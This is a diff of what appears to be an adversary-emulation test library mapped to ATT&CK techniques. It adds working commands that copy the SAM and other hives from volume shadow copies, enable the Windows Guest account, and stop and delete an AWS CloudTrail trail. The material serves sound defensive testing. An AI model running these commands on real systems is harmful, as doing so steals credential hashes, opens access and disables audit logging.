@@ -5440,19 +5440,23 @@ credential-access:
           Invoke-PowerDump
         name: powershell
         elevation_required: true
-    - name: dump volume shadow copy hive with certutil
+    - name: dump volume shadow copy hives with certutil
       auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
       description: |
-        Dump the SAM hive from volume shadow copies with the certutil utility
+        Dump hives from volume shadow copies with the certutil utility
         This can be done with a non-admin user account
       supported_platforms:
       - windows
       input_arguments:
-        file_path:
+        dump_path:
           description: Path where the hive will be dumped
           type: Path
           default: "$ENV:temp"
-        file_name:
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
           description: Name of the dumped hive
           type: String
           default: myhive
@@ -5462,13 +5466,48 @@ credential-access:
           $shadowlist = get-wmiobject win32_shadowcopy
           $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
           $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
-          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\SYSTEM"
-          certutil -f -v -encodehex $shadowpath #{file_path}\#{file_name} 2
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2
         name: powershell
         elevation_required: false
         cleanup_command: |
           write-host ""
-          $toremove = #{file_path} + "\" + '#{file_name}'
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
+    - name: dump volume shadow copy hives with System.IO.File
+      auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+      description: 'Dump hives from volume shadow copies with System.IO.File
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          $mydump = #{dump_path} + '\' + '#{dumped_hive}'
+          [System.IO.File]::Copy($shadowpath , $mydump)
+        name: powershell
+        elevation_required: false
+        cleanup_command: |-
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
           rm $toremove
   T1555.002:
     technique:
@@ -11689,6 +11728,23 @@ privilege-escalation:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -21916,6 +21972,23 @@ defense-evasion:
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
+        name: command_prompt
+        elevation_required: true
   T1578.003:
     technique:
       external_references:
@@ -22492,7 +22565,50 @@ defense-evasion:
       - Matt Snyder, VMware
       x_mitre_platforms:
       - IaaS
-    atomic_tests: []
+      identifier: T1562.008
+    atomic_tests:
+    - name: AWS CloudTrail Changes
+      auto_generated_guid: 9c10dc6b-20bd-403a-8e67-50ef7d07ed4e
+      description: 'Creates a new cloudTrail in AWS, Upon successful creation it will
+        Update,Stop and Delete the cloudTrail
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        cloudtrail_name:
+          description: Name of the cloudTrail
+          type: String
+          default: redatomictesttrail
+        s3_bucket_name:
+          description: Name of the bucket
+          type: String
+          default: redatomic-test
+        region:
+          description: Name of the region
+          type: String
+          default: us-east-1
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: |
+          cat ~/.aws/credentials | grep "default"
+          aws s3api create-bucket --bucket #{s3_bucket_name} --region #{region}
+          aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1562.008/src/policy.json
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: |
+          aws cloudtrail create-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --region #{region}
+          aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
+          aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
+          aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
+        cleanup_command: "aws s3 rb s3://#{s3_bucket_name} --force \n"
+        name: sh
+        elevation_required: false
   T1600.002:
     technique:
       id: attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5
@@ -40398,6 +40514,23 @@ persistence:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -68849,6 +68982,23 @@ initial-access:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
